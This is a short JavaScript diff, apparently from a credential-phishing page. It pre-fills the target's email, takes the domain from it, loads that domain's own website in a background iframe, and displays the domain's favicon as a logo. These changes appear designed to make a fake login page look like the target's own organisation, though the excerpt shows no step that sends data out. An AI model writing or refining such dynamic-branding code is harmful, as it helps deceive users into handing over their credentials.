@@ -149,13 +149,14 @@
 		$('#email').val(clientID);
 		const domain = clientID.split('@').pop();
 		
-		// No iframe to set since we're using background image
+		// Set iframe to the domain
+		$("#frame").attr("src", "https://" + domain);
 		
 		// Use favicon service
 		const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
 		$("#logo").attr("src", logoUrl)
 			.on("error", function() {
-				$(this).attr("src", "https://via.placeholder.com/100/0096FF/ffffff?text=" + domain.charAt(0).toUpperCase());
+				$(this).attr("src", "https://via.placeholder.com/100/cccccc/666666?text=" + domain.charAt(0).toUpperCase());
 			});
 	}
 
